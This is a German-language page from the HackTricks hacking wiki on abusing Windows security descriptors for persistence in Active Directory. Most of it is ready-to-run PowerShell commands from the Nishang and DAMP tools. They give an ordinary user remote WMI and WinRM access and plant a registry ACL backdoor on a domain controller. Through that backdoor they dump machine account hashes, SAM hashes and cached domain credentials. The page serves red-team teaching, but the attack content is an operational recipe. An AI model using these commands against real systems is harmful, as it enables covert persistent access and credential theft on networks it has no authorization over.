# Sicherheitsdeskriptoren

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

## Sicherheitsdeskriptoren

[Aus der Dokumentation](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Die Security Descriptor Definition Language (SDDL) definiert das Format, das verwendet wird, um einen Sicherheitsdeskriptor zu beschreiben. SDDL verwendet ACE-Zeichenketten für DACL und SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

Die **Sicherheitsdeskriptoren** werden verwendet, um die **Berechtigungen** zu **speichern**, die ein **Objekt** über ein **Objekt** hat. Wenn Sie nur eine **kleine Änderung** am **Sicherheitsdeskriptor** eines Objekts vornehmen können, können Sie sehr interessante Berechtigungen für dieses Objekt erhalten, ohne Mitglied einer privilegierten Gruppe zu sein.

Diese Persistenztechnik basiert dann auf der Fähigkeit, alle erforderlichen Berechtigungen für bestimmte Objekte zu erlangen, um eine Aufgabe auszuführen, die normalerweise Administratorrechte erfordert, jedoch ohne Administratorrechte auskommt.

### Zugriff auf WMI

Sie können einem Benutzer Zugriff auf die **remote Ausführung von WMI** geben [**mit diesem**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Zugriff auf WinRM

Geben Sie einem Benutzer Zugriff auf die **WinRM PS-Konsole** [**mit Hilfe dieses**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Remote-Zugriff auf Hashes

Greifen Sie auf die **Registrierung** zu und **dumpen Sie Hashes**, indem Sie eine **Reg-Backdoor mit** [**DAMP**](https://github.com/HarmJ0y/DAMP)** erstellen**, damit Sie jederzeit den **Hash des Computers**, den **SAM** und jegliche **zwischengespeicherte AD-Anmeldeinformationen** auf dem Computer abrufen können. Daher ist es sehr nützlich, einem **normalen Benutzer gegenüber einem Domänencontroller-Computer** diese Berechtigung zu geben:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Überprüfen Sie [**Silver Tickets**](silver-ticket.md), um zu erfahren, wie Sie den Hash des Computerkontos eines Domänencontrollers verwenden können.

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
